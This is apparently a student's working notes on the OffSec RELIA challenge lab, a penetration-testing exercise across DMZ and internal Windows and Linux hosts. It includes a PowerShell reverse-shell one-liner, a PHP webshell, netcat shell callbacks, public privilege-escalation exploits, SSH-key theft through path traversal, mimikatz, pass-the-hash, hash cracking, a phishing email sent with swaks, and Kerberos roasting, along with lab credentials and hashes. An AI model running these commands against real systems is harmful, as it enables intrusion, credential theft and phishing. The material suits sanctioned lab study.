### Background
Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.
![Figure 1: Challenge Scenario](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR-LABS/imgs/challengelab2/01233ad451c1561bc376ad96effdf101-CL2Topo4px.png)



### NMAP

**192.168.112.250**
Challenge 2 - WINPREP OS Credentials
```
offsec / lab
```

**192.168.112.248** (EXTERNAL host) - EXTERNAL.DMZ.RELIA.COM
![[Pasted image 20250316115151.png]]

**192.168.112.247** - WEB02.DMZ.RELIA.COM
Website with RELIA
![[Pasted image 20250316115357.png]]
**192.168.112.246** (Linux) - DEMO.DMZ.RELIA.COM
"demo"
![[Pasted image 20250316115445.png]]

**192.168.112.191** (Windows) LOGIN.DMZ.RELIA.COM
- relia.com RDP

![[Pasted image 20250316115735.png]]
**192.168.112.245** (WEB01) WEB01.DMZ.RELIA.COM
![[Pasted image 20250316115859.png]]
- Linux box with anonymous FTP login :)

**192.168.112.189** (MAIL SERVER) MAIL.DMZ.RELIA.COM

![[Pasted image 20250316120020.png]]

Probably will start by targeting **192.168.112.245** (WEB01) with the ftp anonymous login. Environment got fucked. 
Logged in to FTP
![[Pasted image 20250316130510.png]]
Not much here. Maybe can "put" a revsh. 

Test putting a file on the ftp server. Permission denied. 

Moving to website. 

![[Pasted image 20250316131313.png]]
- Users: Miranda McLaren, Steven P Stephenson, Peter Wunder, Mark Markerson
- No place for user input

Running `gobuster`
```
gobuster dir -u 'http://192.168.112.245' -w /usr/share/wordlists/dirb/big.txt
```

Another page on port 8000
![[Pasted image 20250316133134.png]]
Login page:
![[Pasted image 20250316133157.png]]



**http://192.168.112.246/

![[Pasted image 20250316132434.png]]
- got this string from page source

![[Pasted image 20250316132531.png]]
- code format 

![[Pasted image 20250316132904.png]]
- Error message


### Crackmapexec

Listed shares on EXTERNAL box with random creds "admin:admin"
`crackmapexec smb 192.168.112.248 -u 'admin' -p 'admin' --shares`
![[Pasted image 20250316140616.png]]
- transfer share (RW)
- Users (read)

Mounting `transfer` directory 
`sudo mount -t cifs -o 'username=admin,password=admin' //192.168.112.248/transfer /mnt`
![[Pasted image 20250316141805.png]]

Some stuff. 

![[Pasted image 20250316142501.png]]
Machine key, decryption key

![[Pasted image 20250316143003.png]]
- machine key: `F678BA7AD2EC1FD3753E9E34E323095595DC7D4A`
- decryption key: `4A74B4EBD682F1A3E57F28733D7C630D1C7BC4539B721E82`
- 3DES

Database creds
![[Pasted image 20250316143230.png]]
- `dnnuser:DotNetNukeDatabasePassword!`

Another login:
![[Pasted image 20250316160847.png]]

Got an email: ![[Pasted image 20250316161742.png]]


**192.168.112.249**
Another user from LEGACY box at `192.168.112.249:8000`
adrian
![[Pasted image 20250318195002.png]]

There's a lot of interesting info for the LEGACY box.

ASP NET version header 

/Jp5a3HZA.ashx: Retrieved x-aspnet-version header: 4.0.30319


Lots of interesting directories over port 80 also. Including a user login and aspnet_client.

Restart by scanning each port. 

### FOUND CREDS!!!
Nontraditional FTP port. 

`ftp 192.168.187.247 14020`
creds: anonymous:anonymous
![[Pasted image 20250319220630.png]]
`mark@relia.com ` password: `OathDeeplyReprieve91`

Use FQDN: web02.relia.com

Using crackmapexec. 

`crackmapexec smb 192.168.187.247 -u "mark" -p "OathDeeplyReprieve91" -d web02.relia.com`
![[Pasted image 20250319235413.png]]

Valid creds, but he is not an admin.

Try RDP?
`xfreerdp3 /u:web02.relia.com\mark /p:OathDeeplyReprieve91 /v:192.168.187.247`

Nope.

WEB01 exploit actually worked. 

![[Pasted image 20250321205105.png]]

Users
![[Pasted image 20250321205214.png]]

Summary:
- Directory traversal vulnerability on WEB01 (.245)
- No ssh keys in any home folders
- Found IIS server configuration credentials from "umbraco.pdf" by connecting to FTP (14020) on WEB02 (.247) `mark:OathDeeplyReprieve91`
- IIS only allows access to Umbraco using server FQDN (web02.relia.com)
- Umbraco CMS is likely set up for WEB02

Okay. holy shit. So the ephemeral http port 14080 does lead to a webpage when using the FQDN. 

![[Pasted image 20250323142631.png]]
- Umbraco installation page at `web02.relia.com:14080` (like the pdf suggested)

ANOTHER FUCKING LOGIN. If mark's creds don't fucking work...
![[Pasted image 20250323142749.png]]
- MARK'S CREDENTIALS FINALLY WORKED!!!!!
- Logged in to Ubbraco CMS server holy shit. 

![[Pasted image 20250323143018.png]]
- Umbraco version 7.12.4 assembly: 1.0.6879.21982

Two interesting exploits for RCE against Umbraco version based on searchsploit results. 

![[Pasted image 20250323143428.png]]
- Second exploit worked. Trying to figure out how to get RCE now. 

Systeminfo for web02:
![[Pasted image 20250323144535.png]]
- Microsoft Windows Server 2022 Standard
- OS version 10.0.20348 N/A Build 20348

Found this HTB walkthrough. https://y4th0ts.medium.com/remote-hackthebox-988de9608d4d

![[Pasted image 20250323144953.png]]

Uploading powershell oneliner. Set up NC listener. 

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![[Pasted image 20250323151309.png]]

Executed exploit like so:

`python 49488.py -u mark@relia.com -p 'OathDeeplyReprieve91' -i 'http://web02.relia.com:14080' -c powershell.exe -a '/inetpub/wwwroot/Media/1001/revsh.ps1'`

![[Pasted image 20250323152913.png]]

INITIAL ACCESS BITCHHHH on WEB02
![[Pasted image 20250323153014.png]]
- I have SeImpersonatePrivilege (nice)

Users - Admin, Public, and .NET 

![[Pasted image 20250323153212.png]]

Program Files
![[Pasted image 20250323153333.png]]

I need to priv esc. Going to try to use #RoguePotato

Rogue Potato worked!!!

1. Uploaded two binaries to web server through the GUI.
2. Setup nc listener on port 3001
3. Setup socat `sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.226.247:9999`
4. Executed `./roguepotato.exe -r 192.168.45.222 -e "../1004/nc64.exe 192.168.45.222 3001 -e cmd.exe" -l 9999`
![[Pasted image 20250323221346.png]]

1. Profit

![[Pasted image 20250323221115.png]]

Owned WEB02. 

![[Pasted image 20250323221510.png]]
Poking around web02. I wonder what this is..
![[Pasted image 20250323221824.png]]
- Tried to curl this and that didn't work
- Maybe try proxychains to access this?

Tried to read powershell history, but there was nothing. 
Nothing interesting in any folders so far. 

Found passwords.txt in xampp directory.

![[Pasted image 20250323231807.png]]
mysql stuff
![[Pasted image 20250323232826.png]]
Found postgres database creds
![[Pasted image 20250323234542.png]]
ftp creds
![[Pasted image 20250323235025.png]]

I am going to try to use proxychains to nmap the internal network. Or try to use socat to enumerate that other port running.

Or maybe do a bash #portscanner
Bash for loop to sweep for hosts with an open port 445 on the /24 subnet
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;

done
```

Random: password created for new user:

![[Pasted image 20250325215054.png]]
`xHn(Ogm=1s` - tried netexec using this against each box. no luck. 

I need to figure out which box will let me pivot to the internal network. Maybe web01?

Connected to this random port running on localhost. Looks like it's the FileZilla thing based on the error. 

`nc64.exe 127.0.0.1 14147`
![[Pasted image 20250326222449.png]]

Need to use proxychains to try to nmap the internal network.

Bind SOCKS proxy to loopback of Kali

`ssh -N -R 9998 cadet@192.168.45.222`

pewp
![[Pasted image 20250327214046.png]]

proxychains did not work

![[Pasted image 20250327220940.png]]
not sure if my little tunnel worked either though.

proxychains nmap against web01 

![[Pasted image 20250327221717.png]]

against login
![[Pasted image 20250327221902.png]]

against mail
![[Pasted image 20250327222124.png]]

Ran mimikatz on web02

`lsadump::sam`

Looks like zachary may be a domain user?

PtH in mimikatz did not work.

![[Pasted image 20250327230412.png]]

Hopefully use admin hash and psexec to connect to web02 in the future:

`impacket-psexec -hashes 2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14 administrator@192.168.226.247`

About zachary
![[Pasted image 20250327235607.png]]
about mark 
![[Pasted image 20250327235630.png]]
Summary of info
- Pwn3d WEB02
- Found FTP creds, POSTGRES db creds
- WEB01 has FTP server
- Have admin, zachary, and mark's ntlm hashes

Maybe try connecting to web01 ftp server using creds. 
`zaphod:blabla` - these didn't work.

`dir /s /b | findstr "password"`

![[Pasted image 20250328211048.png]]

Alright. got hint to find the `.kdbx` file in EXTERNAL.


Mounting the share again.

`sudo mount -t cifs -o 'username=admin,password=admin' //192.168.207.248/transfer /mnt`

Search for `.kdbx` with `find . ".kdbx"`

![[Pasted image 20250329224657.png]]

`keepass2john Database.kdbx > keepass.hash`

`13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager`

Hashcat mode 13400.

`hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`

Hash cracked to `welcome1`

Opening up Database and entering password.

`keepassxc Database.kdbx` - Installed keepassxc `sudo apt install keepassxc`

Two new usernames and passwords. 

![[Pasted image 20250330000410.png]]
- `bo:Luigi=Papal1963`
- `Michael321:12345`
- `emma:SomersetVinyl1!`


RDP as emma worked to EXTERNAL

`xfreerdp3 /u:emma /p:SomersetVinyl1! /v:192.168.128.248`

![[Pasted image 20250330112221.png]]

Running winPEAS. 

Mark is an administrator on EXTERNAL box. I wonder if his creds from umbraco will work? No. 

Hint was that mark's password is in an environment variable as `AppKey`.

`Get-ChildItem Env:`

![[Pasted image 20250330134122.png]]

I was able to RDP to EXTERNAL (.248) as Mark. Pwn3d this box. 

`xfreerdp3 /u:mark /p:'!8@aBRBYdb3!' /v:192.168.128.248`

![[Pasted image 20250330134555.png]]

Also a hint, but mark's creds are meant to work on (.250) as well. 

Moving on to WEB01 path traversal vulnerability 

Get information on where ssh keys are. 

`./50383.sh targets.txt /etc/ssh/sshd_config`
![[Pasted image 20250331191915.png]]

Found anita's ssh keys!

`./50383.sh targets.txt /home/anita/.ssh/authorized_keys`

![[Pasted image 20250331192156.png]]

Her private keys here..

`./50383.sh targets.txt /home/anita/.ssh/id_ecdsa`

![[Pasted image 20250331193443.png]]

Holy shit. make sure there is a new line after the end of the saved ssh key or else will get "error in libcrypto" error.

![[Pasted image 20250331213025.png]]

Looks like ssh private key has a pass phrase. 

`ssh2john anita_ecdsa > anita_ecdsa.hash`

```
└─$ cat anita_ecdsa.hash 
anita_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183
```

Remove the "anita_ecdsa" part. 

`hashcat --help | grep -i "ssh"`

![[Pasted image 20250331213717.png]]
- hashcat mode 22921

Forgot hashcat is not compatible with this ssh hash type. 

Followed steps from [[15.2 Password Cracking Fundamentals]] to create ssh rules. Need to use john to crack this type of ssh key.

`john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules anita_ecdsa.hash`
^^ this was taking way too long with the rule so I just switched to wordlist only and it cracked within a couple mins.

passphrase: fireball.

`john --wordlist=/usr/share/wordlists/rockyou.txt anita_ecdsa8000.hash`

![[Pasted image 20250331230801.png]]
`ssh -vvv -i anita_ecdsa anita@relia -p2222`

![[Pasted image 20250331230859.png]]

Enumerating for linux priv esc on web01 

![[Pasted image 20250401210552.png]]


![[Pasted image 20250402235005.png]]

Uploaded and executed linpeas.sh 

Worth checking out:
```
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh
```

```
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
```

Spawn TTY shell

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Interesting
![[Pasted image 20250407202828.png]]

Okay. checklist time. 

- Kernel and distribution release details
- System Information:
    - Hostname
	    - `WEB01`
    - Networking details:
    - Current IP
	    - `192.168.212.245`
    - Default route details
	    - `ip route show default`
	    ![[Pasted image 20250408211745.png]]
    - DNS server information
    ![[Pasted image 20250408211820.png]]
    
- User Information:
    - Current user details
    `uid=1004(manita) gid=1004(manita) groups=1004(manita),998(apache)`
    - Last logged on users
    ![[Pasted image 20250408192606.png]]
    - Shows users logged onto the host
![[Pasted image 20250408192518.png]]
    - List all users including uid/gid information
    ![[Pasted image 20250408192336.png]]
    ![[Pasted image 20250408192414.png]]
 
    - Sudo `sudo -V`
```
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```
    

- Searches:
    - Locate all SUID/GUID files
    ![[Pasted image 20250408205649.png]]
    - Locate all world-writable SUID/GUID files
    - Locate all SUID/GUID files owned by root
    - Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
    - Locate files with POSIX capabilities
    - List all world-writable files
    - Find/list all accessible *.plan files and display contents
    - Find/list all accessible *.rhosts files and display contents
    - Show NFS server details
    - Locate _.conf and_.log files containing keyword supplied at script runtime
    - List all *.conf files located in /etc
    - Locate mail
- Platform/software specific tests:
    - Checks to determine if we're in a Docker container
    - Checks to see if the host has Docker installed
    - Checks to determine if we're in an LXC container

 ### SUID
 `ls /usr/bin/sudo -alh`

### Find SUID binaries
```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![[Pasted image 20250408191211.png]]
![[Pasted image 20250408191239.png]]

### List capabilities of binaries

![[Pasted image 20250408191315.png]]

List world writable files on the system.

```
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null [](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#__codelineno-37-2)find / -perm -2 -type f 2>/dev/null [](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#__codelineno-37-3)find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

![[Pasted image 20250408191756.png]]

## Shared Library

### ldconfig

Identify shared libraries with `ldd`

```
ldd /opt/binary
```


## Hijack TMUX session

Require a read access to the tmux socket : `/tmp/tmux-1000/default`

```
export TMUX=/tmp/tmux-1000/default,1234,0 [](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#__codelineno-55-2)tmux ls
```

![[Pasted image 20250408205818.png]]

Finally cheated and it was an exploit 

wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py

`chmod +x exploit_nss.py`

`python3 exploit_nss.py`

![[Pasted image 20250408223420.png]]

`cd /root`

![[Pasted image 20250408223652.png]]

Mail server 

````
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 192.168.212.189
````


Moved to demo box and looks like anita's ssh key also works here :)

Spawn TTY

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Still only two network adapters 

![[Pasted image 20250409195516.png]]

![[Pasted image 20250409195537.png]]

Only two users here 

![[Pasted image 20250409195652.png]]

Maybe I should crack her password so I can use sudo?

```
anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::
```

Or crack offsec's

```
offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::
```

Or crack root's...

```
root:$6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5M.WbRJyyQyjh//JXUH0hyQVyyhWgj/:19291:0:99999:7:::
```

Use #john to try to crack the `/etc/shadow`  file collected from WEB01

Usage:
`unshadow PASSWORD-FILE SHADOW-FILE`

`unshadow passwd root.hash > passwd.txt`

`john passwd.txt`

Hashes not crackable (also took really long time)

Also going to run linpeas. 

![[Pasted image 20250409202224.png]]

```
anita@demo:~$ cat /etc/issue
Ubuntu 22.04.1 LTS \n \l
```


```
anita@demo:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

```
anita@demo:~$ uname -a
Linux demo 5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

```
anita@demo:~$ routel
         target            gateway          source    proto    scope    dev tbl
        default    192.168.239.254                   static          ens192 
 192.168.239.0/ 24                 192.168.239.246   kernel     link ens192 
     127.0.0.0/ 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
192.168.239.246              local 192.168.239.246   kernel     host ens192 local
192.168.239.255          broadcast 192.168.239.246   kernel     link ens192 local
            ::1                                      kernel              lo 
            ::1              local                   kernel              lo local
/usr/bin/routel: 48: shift: can't shift that many
```

Found exploit for dirtypipe but having compatibility issues. 

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/compile.sh

Kept getting issues because needed cross-compiler to go from ARM to x86_64 architecture. 

Follow these steps:

1- Install a **cross-compiler** version of GCC (sudo apt install gcc-x86-64-linux-gnu)

2- Compile the code (x86_64-linux-gnu-gcc -static -o exploit exploit-2.c)

`x86_64-linux-gnu-gcc -static -o exploit exploit.c`

Exploit ran, but got a different error now. :( 

![[Pasted image 20250410165332.png]]


```
OS: Linux version 5.15.0-52-generic (buildd@lcy02-amd64-032) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
User & Groups: uid=1001(anita) gid=1001(anita) groups=1001(anita)
Hostname: demo
```


Pivoting to attack LEGACY (.249)

![[Pasted image 20250411104402.png]]
- RiteCMS version v3

There's a login page (feroxbuster did not discover this..)

![[Pasted image 20250411104649.png]]
- Logging in as `admin:admin` worked. Yay. 

Now I can attempt this exploit: https://www.exploit-db.com/exploits/50616

![[Pasted image 20250411104759.png]]

There's a place to upload files. 

Upload php webshell. 

```
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

I am adrian..

![[Pasted image 20250411115252.png]]

Okay.. now can I get a reverse shell from here...?

This reverse shell was the winner :) 

https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

![[Pasted image 20250411120658.png]]

Initial access on legacy as adrian. 

![[Pasted image 20250411120800.png]]

![[Pasted image 20250411122028.png]]

Okay so I am damon now. 

```
PS C:\xampp\htdocs\cms\media> $password = ConvertTo-SecureString "i6yuT6tym@" -AsPlainText -Force
PS C:\xampp\htdocs\cms\media> $cred = New-Object System.Management.Automation.PSCredential("damon", $password)
PS C:\xampp\htdocs\cms\media> Enter-PSSession -ComputerName LEGACY -Credential $cred
[LEGACY]: PS C:\Users\damon\Documents> 
```

I'm an admin.

![[Pasted image 20250411130315.png]]

I can't change directories or anything. 

Just going to login via #evilwinrm 

`evil-winrm -i 192.168.232.249 -u damon -p "i6yuT6tym@"`

Found the github repo. 

![[Pasted image 20250411131925.png]]

Got proof so assuming this box is done. 

feb4844e21fbdfd61fe5d46ea28f6c4d

Poking around a bit here. 

```
*Evil-WinRM* PS C:\staging\htdocs\cms\data> type userdata.db
SQLite format 3@  ‹‹.?Ù
ÑP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)‚,''„tablerite_userdatarite_userdataCREATE TABLE rite_userdata (id INTEGER PRIMARY KEY AUTOINCREMENT, name varchar(255) NOT NULL default '', type tinyint(4) NOT NULL default '0', pw varchar(255) NOT NULL default '', last_login int(11) NOT NULL default '0', wysiwyg tinyint(4) NOT NULL default '0')
¼¼¼9me7d58c3a4a398c71ce38682d970669c81fc5a7187cd8584684aF      huiting34ec288365db207223f6499233c2ee6444c5ccc1e0c0cfb798`BÁ¬B     q       admineeae1de2e1f99e7a9e5afd1492b5f944f3e5df3fe8fa339468cQª
îî'     rite_userdata
```

We have some admin hash. 

`admin:3e250c2bfd46362687d3a871c12b50c7d558904b65860c1bf5`

Token salt: `monkey2021`

![[Pasted image 20250411133405.png]]

![[Pasted image 20250411134342.png]]

Got some more creds:

![[Pasted image 20250411134713.png]]
- `maildmz@relia.com:DPuBT9tGCBrTbR`
- `jim@relia.com`

How to connect to mail server...should I send a phishing email?

Ran through all the steps in [[27.3 Gaining Access to Internal Network]] for sending a phishing email.

```
└─$ sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.138.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap 
Username: maildmz
Password: DPuBT9tGCBrTbR
```

Phishing email / attempt worked!!! Now I am finally on the internal network!! (172.16.192.14)

![[Pasted image 20250411153642.png]]

Need to set up proxychains and nmap the internal network?

Poking around this box first. Looks like there's a keeppass database file. How to transfer it? scp may not work. 

![[Pasted image 20250411154456.png]]
SCP not working because it's PowerShell maybe? So need to set up smbserver with impacket. 

Set up smbserver using [[Forest]] smbserver setup. 

Now need to copy database file into the shared directory...

`Copy-Item Database.kdbx -Destination "\\192.168.45.222\Shared"`

This all seemed to work.

![[Pasted image 20250411160554.png]]
- There's also another share called rrentLocation


Opening keepass database. Of course it's password protected. 

![[Pasted image 20250411160758.png]]

`keepass2john Database.kdbx > keepass.hash`

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

```

Cracked really quickly to `mercedes1`

![[Pasted image 20250411161118.png]]

Opening new database file. We get jim's password. 

`jim@relia.com`
`Castello1!`

We get dmz admin password.  (probably good to LOGIN box)

`dmzadmin`
`SlimGodhoodMope`

That's it. 

![[Pasted image 20250411161540.png]]

![[Pasted image 20250411161607.png]]

I want to set up proxy chains now maybe or maybe priv esc and then do proxychains?

![[Pasted image 20250411162511.png]]
- hostname: WK01
- Logon server: DC02

Ran winpeas. Looks like jim has access to a lot of offsec's folders. Offsec is an admin. 

![[Pasted image 20250411170507.png]]

There's a random executable in jim's Pictures directory?

![[Pasted image 20250411170556.png]]

Increase fuckin scrollback history because I can't review everything. 

![[Pasted image 20250411171411.png]]

Okay this exec.ps1 script is configuring some stuff for a `C:\Windows\Tasks\temp.lnk`
![[Pasted image 20250411171847.png]]
![[Pasted image 20250411171914.png]]
![[Pasted image 20250411171938.png]
![[Pasted image 20250411171809.png]]

What is in C:\attachments? nothing. Nothing in C:\Windows\Tasks either

Need to check all these for passwords. 
```
C:\Users\jim\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
```
- This looks like a massive password list.
- Transferred to kali using smbshare
```
    C:\Users\jim\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
```


```
"C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml"
```

Got an NTLM hash for jim. 

```
  Version: NetNTLMv2
  Hash:    jim::RELIA:1122334455667788:4586a25cfce90e4833acca7b3b8e4de6:01010000000000007e7193632dabdb0177b282fc56f144fc00000000080030003000000000000000000000000020000003822076f3394bde011c2a0c1ed2f4cf4a525d86c51a3e6030021c47343b60900a00100000000000000000000000000000000000090000000000000000000000
```

![[Pasted image 20250411190329.png]]
Priv esc is likely hijacking this dll

![[Pasted image 20250411190519.png]]
`LDAP://DC=relia,DC=com`

Like dis

```
Copy-Item -Path C:\Users\jim\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt -Destination "\\192.168.45.222\Shared"
```

and dis

```
Copy-Item -Path "C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml" -Destination "\\192.168.45.222\Shared"
```

Testing connection to internal mail server. success.

![[Pasted image 20250411211258.png]]

Need to set up tunneling with Ligolo https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/

Okay ligolo proxy g2g.

Adding agent step on Jim's workstation after transferring agent.exe over.

```
./agent.exe -connect 192.168.45.222:11601 -ignore-cert
```

![[Pasted image 20250412191726.png]]

GIT ER DERNNN

On Kali 
```
./proxy -selfcert
```
![[Pasted image 20250412121549.png]]
Add internal network route 

```
sudo ip route add 172.16.98.0/24 dev ligolo
```

![[Pasted image 20250412121825.png]]
![[Pasted image 20250412121916.png]]
Okay, I just did the autoroute thing and that seemed to work.

![[Pasted image 20250412135249.png]]
Ligolo needs to be started with admin privvies. 

Ping to internal network is working!!
![[Pasted image 20250412135415.png]]

Now try nmap again?

```
nmap -Pn -sC -sV 172.16.98.5 -o 172.16.x.5\ \(MAIL.RELIA.COM\)/nmap
```

NMAP to the internal mail server.
![[Pasted image 20250412135438.png]]
- This takes slightly too long. 

Nmap scan results:

![[Pasted image 20250412141813.png]]

Scan for DC02 (.6)




List smb shares on DC02 with jim's creds

```
netexec smb 172.16.98.6 -u jim -p 'Castello1!' --shares
```

![[Pasted image 20250412142658.png]]
```
Windows Server 2022 Build 20348 (name:DC02)
```


WK02 NMAP (.15)

![[Pasted image 20250412143546.png]]
- SMB shares all default 


Linux box (.20) only ssh open

![[Pasted image 20250412143908.png]]

(.21) 



INTRANET (.7)

![[Pasted image 20250412144111.png]]
- only default shares 
- `Windows Server 2022 Build 20348 x64 (name:INTRANET`
- Wordpress site..

Wordpress 6.0.3 Vulns?

![[Pasted image 20250412144354.png]]
- Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29 Server at 172.16.98.7 Port 80


WEBBY "Anna Test Machine"

```
feroxbuster -u http://webby.relia.com/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o ferox1.txt
```

So I'm going to focus on the wordpress site. added the hostname `intranet.relia.com` to `/etc/hosts` and I can see the image on the site. 

![[Pasted image 20250412192339.png]]

gonna run `feroxbuster` with a diff wordlist.

Also gonna run wpscan since this is wordpress. maybe vulnerable plugins?

```
└─$ wpscan --url http://intranet.relia.com/ --enumerate p --plugins-detection aggressive -o wpscan

```

No output + no plugins :(

Just gonna try this 

```
wpscan --url http://intranet.relia.com/
```

Found some very interesting ish here. Especially an uploads directory.

![[Pasted image 20250412193303.png]]

Well here's the login

![[Pasted image 20250412193602.png]]

Enumerate wordpress usernames. Only one: `admin`

```
wpscan --url http://intranet.relia.com/ --enumerate u 
```


Doin things 

![[Pasted image 20250412215911.png]]

Okay so I prob should've ASREP roasted users when logged in as Jim.

This would give username: michelle (smith) and password: NotMyPassword0k?

Was able to RDP in as this user to (.7)

```
xfreerdp3 /u:michelle /p:'NotMyPassword0k?' /v:172.16.98.7
```


![[Pasted image 20250412223429.png]]


Ran bloodhound.py

```
sudo python3 BloodHound.py/bloodhound.py -u michelle -p 'NotMyPassword0k?' -ns 172.16.98.6 -d relia.com -c all
```

![[Pasted image 20250412234254.png]]

This is michelle's hash from the asrep roasting with Rubeus. 

```
./rubeus.exe asreproast /nowrap
```

![[Pasted image 20250413123343.png]]

```
sudo impacket-GetUserSPNs -request -dc-ip 172.16.199.6 relia.com/jim 
```

![[Pasted image 20250413124741.png]]

We have a TGS for the IIS service on webby.

```
